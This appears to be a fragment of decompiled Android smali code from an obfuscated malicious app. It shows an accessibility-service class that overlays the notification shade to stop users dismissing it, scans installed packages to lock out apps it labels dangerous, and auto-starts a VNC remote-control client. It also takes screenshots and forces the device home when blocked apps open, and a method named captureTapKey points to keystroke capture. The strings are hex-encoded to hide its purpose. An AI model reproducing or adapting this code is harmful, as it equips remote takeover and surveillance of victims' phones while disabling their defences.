    invoke-direct/range {v5 .. v10}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 208
    .line 209
    .line 210
    const v4, 0x800033

    .line 211
    .line 212
    .line 213
    iput v4, v5, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 214
    .line 215
    iput v0, v5, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 216
    .line 217
    iput v0, v5, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 218
    .line 219
    invoke-interface {v1, v2, v5}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 220
    .line 221
    .line 222
    iput-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierView:Landroid/view/View;

    .line 223
    .line 224
    iput-boolean v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    .line 225
    .line 226
    const-string v0, "00180045007300A600D4009A00EF00E7000100770049009500F900BA00C000E7002C0060005E009500FC00BE00CB00E700220072005F008200F400FF009A00AF007E"

    .line 227
    .line 228
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 229
    .line 230
    .line 231
    const-string v0, "006F00360048008500AD"

    .line 232
    .line 233
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 234
    .line 235
    .line 236
    const-string v0, "006F00360058009200E400B000C700B3007E"

    .line 237
    .line 238
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 239
    .line 240
    .line 241
    const-string v0, "006F0036005F008200FE00AC00DB00B3003A002B"

    .line 242
    .line 243
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    .line 244
    .line 245
    .line 246
    goto :goto_6

    .line 247
    :catch_3
    move-exception v0

    .line 248
    const-string v1, "00180045007300A600D4009A00EF00E7000500770052008B00F500BB009200B3002C0036005A008300F400FF00D000A6003100640052008200E200E50092"

    .line 249
    .line 250
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 251
    .line 252
    .line 253
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 254
    .line 255
    .line 256
    :goto_6
    return-void
.end method

.method private static final addShadeBarrier$lambda$47(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 0

    .line 1
    if-eqz p2, :cond_0

    .line 2
    .line 3
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getAction()I

    .line 4
    .line 5
    .line 6
    move-result p1

    .line 7
    if-nez p1, :cond_0

    .line 8
    .line 9
    goto/16 :goto_0

    .line 10
    :cond_0
    if-eqz p2, :cond_1

    .line 11
    .line 12
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getAction()I

    .line 13
    .line 14
    .line 15
    move-result p1

    nop

    nop

    .line 16
    const/4 p2, 0x2

    .line 17
    if-ne p1, p2, :cond_1

    .line 18
    .line 19
    :goto_0
    invoke-virtual {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->dismissNotificationShade$app_release()V

    .line 20
    .line 21
    .line 22
    :cond_1
    const/4 p0, 0x1

    .line 23
    return p0
.end method

.method private final autoLockDangerousApps()V
    .locals 8

    .line 1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const/4 v1, 0x0

    .line 6
    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 11
    .line 12
    .line 13
    move-result-object v0

    .line 14
    move v2, v1

    .line 15
    :cond_0
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 16
    .line 17
    .line 18
    move-result v3

    .line 19
    if-eqz v3, :cond_3

    .line 20
    .line 21
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 22
    .line 23
    .line 24
    move-result-object v3

    .line 25
    check-cast v3, Landroid/content/pm/PackageInfo;

    nop

    .line 26
    .line 27
    iget-object v3, v3, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    .line 28
    .line 29
    sget-object v4, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 30
    .line 31
    invoke-virtual {v3, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 32
    .line 33
    .line 34
    move-result-object v3

    .line 35
    const-string v5, "00200079005600C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 36
    .line 37
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    .line 39
    .line 40
    move-result-object v5

    .line 41
    invoke-virtual {v3, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 42
    .line 43
    .line 44
    move-result v5

    .line 45
    if-nez v5, :cond_0

    .line 46
    .line 47
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 48
    .line 49
    .line 50
    move-result-object v5

    .line 51
    invoke-virtual {v5, v4}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 52
    .line 53
    .line 54
    move-result-object v4

    .line 55
    invoke-virtual {v3, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 56
    .line 57
    .line 58
    move-result v4

    .line 59
    if-nez v4, :cond_0

    .line 60
    .line 61
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->AUTO_LOCK_PACKAGES:Ljava/util/Set;

    .line 62
    .line 63
    invoke-interface {v4, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 64
    .line 65
    .line 66
    move-result v4

    nop

    .line 67
    if-nez v4, :cond_2

    .line 68
    .line 69
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->AUTO_LOCK_SUBSTRINGS:[Ljava/lang/String;

    .line 70
    .line 71
    array-length v5, v4

    .line 72
    move v6, v1

    .line 73
    :goto_1
    if-ge v6, v5, :cond_0

    .line 74
    .line 75
    aget-object v7, v4, v6

    .line 76
    .line 77
    invoke-static {v3, v7, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 78
    .line 79
    .line 80
    move-result v7

    .line 81
    if-eqz v7, :cond_1

    .line 82
    .line 83
    goto :goto_2

    nop

    .line 84
    :cond_1
    add-int/lit8 v6, v6, 0x1

    .line 85
    .line 86
    goto/16 :goto_1

    .line 87
    :catch_0
    move-exception v0

    nop

    .line 88
    goto/16 :goto_3

    .line 89
    :cond_2
    :goto_2
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 90
    .line 91
    invoke-interface {v4, v3}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 92
    .line 93
    .line 94
    move-result v4

    .line 95
    if-nez v4, :cond_0

    .line 96
    .line 97
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 98
    .line 99
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 100
    .line 101
    .line 102
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLockedApps$cp()Ljava/util/Set;

    .line 103
    .line 104
    .line 105
    move-result-object v4

    .line 106
    sget-object v5, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 107
    .line 108
    invoke-virtual {v3, v5}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 109
    .line 110
    .line 111
    move-result-object v5

    .line 112
    invoke-interface {v4, v5}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 113
    .line 114
    .line 115
    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    .line 116
    .line 117
    invoke-interface {v4, v3}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 118
    .line 119
    .line 120
    add-int/lit8 v2, v2, 0x1

    .line 121
    .line 122
    goto :goto_0

    .line 123
    :cond_3
    if-lez v2, :cond_4

    .line 124
    .line 125
    const-string v0, "00020063004F008800BD00B300DD00A400280073005F00C7"

    nop

    .line 126
    .line 127
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    const-string v0, "00630072005A008900F700BA00C000A800360065001B008600E000AF00C100FD0063"

    .line 131
    .line 132
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 133
    .line 134
    .line 135
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->autoLockedApps:Ljava/util/Set;

    .line 136
    .line 137
    const/16 v1, 0x3f

    .line 138
    .line 139
    const/4 v2, 0x0

    .line 140
    invoke-static {v0, v2, v2, v1}, Lv/s/imhBI9RqzETHtVIJe;->euF5Udt5Rqv3Qmea(Ljava/util/Collection;Ljava/lang/String;Lv/s/deLJ4Z0aL3hcJ3O1;I)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 141
    .line 142
    .line 143
    :cond_4
    return-void

    .line 144
    :goto_3
    const-string v1, "00220063004F008800DC00B000D100AC000700770055008000F500AD00DD00B200300057004B009700E300FF00D700B500310079004900DD00B0"

    .line 145
    .line 146
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 147
    .line 148
    .line 149
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 150
    .line 151
    .line 152
    return-void
.end method

.method private final autoStartVncClient()V
    .locals 4

    .line 1
    :try_start_0
    sget-object v0, Lv/s/ktukzhfmAkOuMU;->dDIMxZXP1V8HdM:Lv/s/ktukzhfmAkOuMU;

    .line 2
    .line 3
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    invoke-static {v0}, Lv/s/ktukzhfmAkOuMU;->gmNWMfvn6zlEj(Landroid/content/Context;)Ljava/lang/String;

    .line 8
    .line 9
    .line 10
    move-result-object v0

    .line 11
    const/16 v1, 0x3b

    .line 12
    .line 13
    invoke-static {v1}, Lv/s/KV57Z6oavcB595B8Dy8Z;->dDIMxZXP1V8HdM(I)Ljava/lang/String;

    .line 14
    .line 15
    .line 16
    move-result-object v1

    nop

    .line 17
    const-string v2, "00150058007800C700C5008D00FE00E7002000790055008100F900B800C700B500260072"

    .line 18
    .line 19
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 20
    .line 21
    .line 22
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 23
    .line 24
    .line 25
    move-result v2

    .line 26
    if-lez v2, :cond_0

    .line 27
    .line 28
    const-string v2, "001A0059006E00B500CF008C00F70095001500530069"

    .line 29
    .line 30
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object v2

    .line 34
    const/4 v3, 0x0

    .line 35
    invoke-static {v1, v2, v3}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 36
    .line 37
    .line 38
    move-result v2

    nop

    .line 39
    if-nez v2, :cond_0

    .line 40
    .line 41
    const-string v2, "00100062005A009500E400B600DC00A000630040007500A400B000BC00DE00AE00260078004F"

    .line 42
    .line 43
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 44
    .line 45
    .line 46
    sget-object v2, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    nop

    .line 47
    .line 48
    invoke-static {p0, v0, v1}, Lv/s/fadfsJa4iEdiwEC4Xm8;->pyu8ovAipBTLYAiKab(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 49
    .line 50
    .line 51
    new-instance v0, Landroid/os/Handler;

    .line 52
    .line 53
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 54
    .line 55
    .line 56
    move-result-object v1

    .line 57
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 58
    .line 59
    .line 60
    new-instance v1, Lv/s/jdOQeRk37T35X5xKW1P;

    .line 61
    .line 62
    const/4 v2, 0x2

    .line 63
    invoke-direct {v1, v2}, Lv/s/jdOQeRk37T35X5xKW1P;-><init>(I)V

    .line 64
    .line 65
    .line 66
    const-wide/16 v2, 0xbb8

    .line 67
    .line 68
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 69
    .line 70
    .line 71
    return-void

    .line 72
    :catch_0
    move-exception v0

    .line 73
    goto :goto_0

    .line 74
    :cond_0
    const-string v0, "00150058007800C700E300BA00C000B100260064001B00B200C20093009200AE002D0060005A008B00F900BB009200A8003100360055008800E400FF00D100A8002D00700052008000E500AD00D700A300790036001C"

    .line 75
    .line 76
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 77
    .line 78
    .line 79
    return-void

    .line 80
    :goto_0
    const-string v1, "00020063004F008800BD00AC00C600A600310062001B00B100DE009C009200A2003100640054009500AA00FF"

    .line 81
    .line 82
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 83
    .line 84
    .line 85
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    return-void
.end method

.method private static final autoStartVncClient$lambda$32()V
    .locals 1

    .line 1
    sget-object v0, Lv/s/RWY6BVSB0XxPbw;->d6c98qX7r0XzUZFibx:Lv/s/iStgVlW5d7CQ5MhFi;

    nop

    nop

    .line 2
    .line 3
    invoke-static {}, Lv/s/fadfsJa4iEdiwEC4Xm8;->xDyLpEZyrcKVe0()Z

    .line 4
    .line 5
    .line 6
    move-result v0

    .line 7
    if-nez v0, :cond_0

    .line 8
    .line 9
    const-string v0, "00150058007800C700FE00B000C600E7002000790055008900F500BC00C600A200270036005A008100E400BA00C000E700700065001700C700E300AB00D300B300360065000100C7"

    .line 10
    .line 11
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    invoke-static {}, Lv/s/fadfsJa4iEdiwEC4Xm8;->xDyLpEZyrcKVe0()Z

    .line 15
    .line 16
    .line 17
    return-void

    .line 18
    :cond_0
    const-string v0, "00150058007800C700F300B000DC00A900260075004F008200F400FF00C100B200200075005E009400E300B900C700AB002F006F001A"

    .line 19
    .line 20
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 21
    .line 22
    .line 23
    return-void
.end method

.method public static synthetic b1EoSIRjJHO5(Lv/s/JRdueaGIH5g8DVCPba;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed$lambda$2(Lv/s/JRdueaGIH5g8DVCPba;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final blockAndGoHome()V
    .locals 6

    .line 1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2
    .line 3
    .line 4
    move-result-wide v0

    .line 5
    iget-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastBlockTimeMs:J

    nop

    nop

    .line 6
    .line 7
    sub-long v2, v0, v2

    nop

    .line 8
    .line 9
    const-wide/16 v4, 0x7530

    .line 10
    .line 11
    cmp-long v2, v2, v4

    .line 12
    .line 13
    if-lez v2, :cond_0

    nop

    .line 14
    .line 15
    const/16 v2, 0x0

    .line 16
    iput v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCountRecent:I

    .line 17
    .line 18
    :cond_0
    iget v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCountRecent:I

    .line 19
    .line 20
    const/4 v3, 0x1

    .line 21
    add-int/2addr v2, v3

    .line 22
    iput v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCountRecent:I

    .line 23
    .line 24
    iput-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastBlockTimeMs:J

    .line 25
    .line 26
    const v2, 0xbb8

    .line 27
    .line 28
    int-to-long v4, v2

    .line 29
    add-long/2addr v0, v4

    .line 30
    iput-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCooldownUntil:J

    .line 31
    .line 32
    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 33
    .line 34
    .line 35
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 36
    .line 37
    const/4 v1, 0x2

    .line 38
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 39
    .line 40
    .line 41
    const-wide/16 v1, 0x32

    nop

    .line 42
    .line 43
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 44
    .line 45
    .line 46
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 47
    .line 48
    const/4 v1, 0x3

    .line 49
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 50
    .line 51
    .line 52
    const-wide/16 v1, 0x64

    .line 53
    .line 54
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 55
    .line 56
    .line 57
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 58
    .line 59
    const/16 v1, 0x11

    nop

    add-int/lit8 v1, v1, -0xd

    .line 60
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 61
    .line 62
    .line 63
    const-wide/16 v1, 0xb4

    .line 64
    .line 65
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 66
    .line 67
    .line 68
    iget v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->blockCountRecent:I

    .line 69
    .line 70
    const/4 v1, 0x3

    .line 71
    if-le v0, v1, :cond_1

    .line 72
    .line 73
    const-string v0, "00180051006E00A600C2009B00EF00E7000600650058008600FC00BE00C600AE002C0078000100C7"

    .line 74
    .line 75
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    const-string v0, "006300740057008800F300B400C100E7002A0078001B00D400A000AC009220D30063007A0054008400FB00B600DC00A0006300650058009500F500BA00DC"

    .line 79
    .line 80
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 81
    .line 82
    .line 83
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 84
    .line 85
    const/4 v1, 0x5

    .line 86
    invoke-direct {v0, p0, v1}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 87
    .line 88
    .line 89
    const-wide/16 v1, 0xfa

    nop

    .line 90
    .line 91
    invoke-direct {p0, v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 92
    .line 93
    .line 94
    :cond_1
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    .line 95
    .line 96
    const-class v1, Lv/s/vbdyByOHPJmeGXlq;

    .line 97
    .line 98
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 99
    .line 100
    .line 101
    const-string v1, "002C0060005E009500FC00BE00CB00980037006F004B0082"

    .line 102
    .line 103
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v1

    .line 107
    const-string v2, "00360066005F008600E400BA"

    .line 108
    .line 109
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 110
    .line 111
    .line 112
    move-result-object v2

    .line 113
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 114
    .line 115
    .line 116
    const-string v1, "002700630049008600E400B600DD00A9"

    .line 117
    .line 118
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 119
    .line 120
    .line 121
    move-result-object v1

    .line 122
    const/16 v2, 0x9c4

    .line 123
    .line 124
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 125
    .line 126
    .line 127
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 128
    .line 129
    .line 130
    return-void

    .line 131
    :catch_0
    move-exception v0

    .line 132
    const-string v1, "00180051006E00A600C2009B00EF00E7000C0060005E009500FC00BE00CB00E7002500770052008B00F500BB008800E7"

    .line 133
    .line 134
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 135
    .line 136
    .line 137
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 138
    .line 139
    .line 140
    return-void
.end method

.method private final captureScreenInternal(Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lv/s/deLJ4Z0aL3hcJ3O1;",
            ")V"
        }
    .end annotation

    .line 1
    const-string v0, "00200077004B009300E500AD00D7009400200064005E008200FE009600DC00B3002600640055008600FC00FF00D100A6002F007A005E008300BC00FF00E100830008002B"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 7
    .line 8
    const/16 v1, 0x1e

    .line 9
    .line 10
    const/4 v2, 0x0

    .line 11
    if-ge v0, v1, :cond_0

    .line 12
    .line 13
    const-string v0, "00100052007000C700E400B000DD00E7002F0079004C00C700F600B000C000E7000200750058008200E300AC00DB00A5002A007A0052009300E900FF00C100A400310073005E008900E300B700DD00B3"

    .line 14
    .line 15
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 16
    .line 17
    .line 18
    if-eqz p1, :cond_1

    .line 19
    .line 20
    invoke-interface {p1, v2}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 21
    .line 22
    .line 23
    return-void

    .line 24
    :cond_0
    :try_start_0
    const-string v0, "000000770057008B00F900B100D500E7000200750058008200E300AC00DB00A5002A007A0052009300E9008C00D700B50035007F0058008200BE00AB00D300AC002600450058009500F500BA00DC00B4002B0079004F00CF00B900F1009C00E9"

    .line 25
    .line 26
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 27
    .line 28
    .line 29
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->screenshotExecutor:Ljava/util/concurrent/ExecutorService;

    .line 30
    .line 31
    new-instance v1, Lv/s/WbI2W97lldWeFi5i54;

    nop

    nop

    .line 32
    .line 33
    invoke-direct {v1, p0, p1}, Lv/s/WbI2W97lldWeFi5i54;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 34
    .line 35
    .line 36
    invoke-static {p0, v0, v1}, Lv/s/VhkhkItRHoue;->gmNWMfvn6zlEj(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/util/concurrent/ExecutorService;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    .line 38
    .line 39
    return-void

    .line 40
    :catch_0
    move-exception v0

    .line 41
    const-string v1, "001000750049008200F500B100C100AF002C0062001B008400F100AF00C600B200310073001B008200E800BC00D700B70037007F0054008900AA00FF"

    .line 42
    .line 43
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 44
    .line 45
    .line 46
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 50
    .line 51
    .line 52
    if-eqz p1, :cond_1

    .line 53
    .line 54
    invoke-interface {p1, v2}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 55
    .line 56
    .line 57
    :cond_1
    return-void
.end method

.method private final captureScreenInternalBitmap(Lv/s/deLJ4Z0aL3hcJ3O1;)V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lv/s/deLJ4Z0aL3hcJ3O1;",
            ")V"
        }
    .end annotation

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 2
    .line 3
    const/16 v1, 0x1e

    .line 4
    .line 5
    const/4 v2, 0x0

    .line 6
    if-ge v0, v1, :cond_0

    nop

    .line 7
    .line 8
    if-eqz p1, :cond_1

    .line 9
    .line 10
    invoke-interface {p1, v2}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 11
    .line 12
    .line 13
    return-void

    .line 14
    :cond_0
    :try_start_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->screenshotExecutor:Ljava/util/concurrent/ExecutorService;

    .line 15
    .line 16
    new-instance v1, Lv/s/NuEgjpX2tI5BrfFMcX0;

    .line 17
    .line 18
    invoke-direct {v1, p1}, Lv/s/NuEgjpX2tI5BrfFMcX0;-><init>(Lv/s/deLJ4Z0aL3hcJ3O1;)V

    .line 19
    .line 20
    .line 21
    invoke-static {p0, v0, v1}, Lv/s/VhkhkItRHoue;->gmNWMfvn6zlEj(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/util/concurrent/ExecutorService;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 22
    .line 23
    .line 24
    return-void

    .line 25
    :catch_0
    if-eqz p1, :cond_1

    .line 26
    .line 27
    invoke-interface {p1, v2}, Lv/s/deLJ4Z0aL3hcJ3O1;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 28
    .line 29
    .line 30
    :cond_1
    return-void
.end method

.method private final captureTapKey(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V
    .locals 20

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    move-object/from16 v0, p2

    .line 4
    .line 5
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v2

    .line 9
    invoke-static {v0, v2}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 10
    .line 11
    .line 12
    move-result v2

    nop

    nop

    .line 13
    if-eqz v2, :cond_0

